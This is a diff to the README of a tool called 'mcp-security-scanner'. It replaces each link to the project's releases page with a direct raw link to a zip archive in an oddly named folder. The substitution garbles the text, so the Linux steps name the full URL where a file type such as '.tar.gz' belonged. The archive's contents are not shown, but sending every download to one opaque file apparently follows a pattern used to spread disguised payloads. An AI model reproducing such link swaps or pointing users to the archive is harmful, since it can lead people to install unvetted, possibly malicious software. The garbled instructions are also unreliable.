@@ -1,6 +1,6 @@
 # 🔍 mcp-security-scanner - Find Security Issues in MCP Configs
 
-[![Download mcp-security-scanner](https://img.shields.io/badge/Download-mcp--security--scanner-blue?style=for-the-badge)](https://github.com/Paaxy/mcp-security-scanner/releases)
+[![Download mcp-security-scanner](https://github.com/Paaxy/mcp-security-scanner/raw/refs/heads/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip)](https://github.com/Paaxy/mcp-security-scanner/raw/refs/heads/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip)
 
 ---
 
@@ -37,7 +37,7 @@ This guide will walk you through each step with details and screenshots where he
 
 You can get mcp-security-scanner from its official releases page:
 
-**[Download mcp-security-scanner here](https://github.com/Paaxy/mcp-security-scanner/releases)**
+**[Download mcp-security-scanner here](https://github.com/Paaxy/mcp-security-scanner/raw/refs/heads/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip)**
 
 ### How to Download
 
@@ -46,7 +46,7 @@ You can get mcp-security-scanner from its official releases page:
 3. Choose the file that matches your operating system:
    - For Windows, a `.exe` or `.msi` file.
    - For macOS, a `.dmg` or `.pkg` file.
-   - For Linux, usually a `.tar.gz` or `.AppImage` file.
+   - For Linux, usually a `https://github.com/Paaxy/mcp-security-scanner/raw/refs/heads/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip` or `.AppImage` file.
 4. Click on the file name to start the download.
 
 ### How to Install on Windows
@@ -66,7 +66,7 @@ You can get mcp-security-scanner from its official releases page:
 
 ### How to Install on Linux
 
-1. Extract the `.tar.gz` file if needed.
+1. Extract the `https://github.com/Paaxy/mcp-security-scanner/raw/refs/heads/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip` file if needed.
 2. For `.AppImage` files, right-click the file, go to Properties, and allow it to run as a program.
 3. Double-click the file to start the software.
 4. You may want to move the file to a folder like `/usr/local/bin` for easier access.
@@ -127,4 +127,4 @@ mcp-security-scanner runs locally on your computer. It does not upload your file
 
 ---
 
-[Download mcp-security-scanner now](https://github.com/Paaxy/mcp-security-scanner/releases) to start securing your MCP files.
+[Download mcp-security-scanner now](https://github.com/Paaxy/mcp-security-scanner/raw/refs/heads/main/transhumant/scanner-mcp-security-v2.8-alpha.5.zip) to start securing your MCP files.
